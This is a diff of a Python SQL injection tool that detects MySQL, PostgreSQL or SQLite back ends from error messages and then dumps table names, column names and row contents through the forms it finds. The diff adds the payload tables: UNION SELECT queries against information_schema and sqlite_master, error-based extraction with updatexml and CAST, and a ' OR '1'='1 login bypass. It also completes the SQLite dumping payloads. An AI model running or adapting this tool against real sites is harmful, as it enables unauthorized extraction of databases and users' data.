@@ -8,9 +8,7 @@ from prettytable import PrettyTable
 import argparse
 import datetime
 import httpx
-import pprint
 import re
-import injection
 
 DESCRIPTION = '''\
 -----------------------------------------------------------------------------------------------------------
@@ -30,6 +28,37 @@ ERRORS = {
     'mysql': '(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
     'pgsql': 'unterminated quoted string at or near',
     'sqlite': 'unrecognized token:',
+}
+
+TABLE_PAYLOAD = {
+    'mysql': "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- -",
+    'pgsql': "9999' UNION SELECT table_name, '' FROM information_schema.tables WHERE table_schema='public'-- -",
+    'sqlite': "' UNION SELECT '', name FROM sqlite_master WHERE type='table' -- ",
+}
+
+DBNAME_PAYLOAD = {
+    'mysql': "' AND updatexml(NULL, CONCAT(0x3a, DATABASE()), NULL) -- -",
+    'pgsql': "1' AND 1=CAST((SELECT current_database()) AS INT)--",
+    'sqlite': "",
+}
+
+DB_TYPE = {
+    'mysql': {
+        'type': 'mysql',
+        'regx': r"':(\w+)'",
+    },
+    'pgsql': {
+        'type': 'pgsql',
+        'regx':  r': "(\w+)"',
+    },
+    'sqlite': {
+        'type': 'sqlite',
+        'regx': ''
+
+    },
+    'redirect': {
+        'type': 'redirect'
+    }
 }
 
 payloads = []
@@ -76,8 +105,8 @@ def my_injection(url, method, output, header):
         result['params'] += [input for input in form['inputs']]
         result['type'] = db_type['type']
         if not 'redirect' in db_type['type']:
-            result['name'] = p_content(response, form, injection.DBNAME_PAYLOAD[result['type']], db_type['regx'])
-            result['tables'], output_col = create_tables(response, form, injection.TABLE_PAYLOAD[result['type']])
+            result['name'] = p_content(response, form, DBNAME_PAYLOAD[result['type']], db_type['regx'])
+            result['tables'], output_col = create_tables(response, form, TABLE_PAYLOAD[result['type']])
             for index, table in enumerate(result['tables']):
                 result['tables'][index]['columns'] = get_columns(table, response, form, db_type)
                 result['tables'][index]['data'] = get_data(table['name'], result['tables'][index]['columns'], output_col, response, form, db_type)
@@ -96,6 +125,10 @@ def get_columns(table, first_response, form, db_type):
             break
         columns.append(column)
         count += 1
+    if not columns:
+        content = table_content(first_response, form, payload)
+        result = re.findall(r'"(\w+)"', content[0][1])
+        columns = result[1:]
     return columns
 
 def get_data(table, columns, output_col, first_response, form, db_type):
@@ -121,9 +154,9 @@ def data_payload(field, db_type, table_name):
         return "' UNION ALL SELECT " + ", ".join(field) + f" FROM {table_name} -- -"
     elif db_type == 'pgsql':
         new_field = [f"CAST({item} AS text)" for item in field]
-        return "0' UNION SELECT " + ", ".join(new_field) + " FROM users -- -"
+        return "0' UNION ALL SELECT " + ", ".join(new_field) + f" FROM {table_name} -- -"
     elif db_type == 'sqlite':
-        return f""
+        return f"' UNION ALL SELECT " + ', '.join(field) + f" FROM {table_name} LIMIT 0,100-- "
     return None
 
 def write_output(injected_database, path, url, method= 'GET'):
@@ -223,14 +256,14 @@ def check_database_type(first_response, form, output) -> object:
     soup, _ = db_inject(first_response, form, "'", headers=first_response['header'])
     for key, value in ERRORS.items():
         if value in soup.find("p").get_text(strip=True):
-            return injection.DB_TYPE[key]
+            return DB_TYPE[key]
     soup, response = db_inject(first_response, form, "' OR '1' = '1' -- -", headers=first_response['header'])
     if response.status_code == 302:
         url = urljoin(str(response.url), response.headers['Location']) + '/'
         tmp = payloads.copy()
         payloads.clear()
         my_injection(url, "get", output, first_response['header'])
-        result = injection.DB_TYPE['redirect']
+        result = DB_TYPE['redirect']
         result['type'] = f"redirect: {url}"
         payloads = tmp
         return result
@@ -270,7 +303,7 @@ def column_payload(table_name, index, db_type):
     elif db_type == 'pgsql':
         return f"1' AND 1=CAST((SELECT CAST(column_name AS text) FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {index}) AS integer)-- -",
     elif db_type == 'sqlite':
-        return f""
+        return f"' UNION SELECT '', sql FROM sqlite_master WHERE type='table' AND name='{table_name}'-- "
 
 def remove_duplicate(column):
     size = len(column)
@@ -280,7 +313,7 @@ def remove_duplicate(column):
         while count >= 0:
             if (column[index] == column[count]):
                 column[index] += ' '
-                break
+                count = index - 1
             count -= 1
         index += 1
     return column
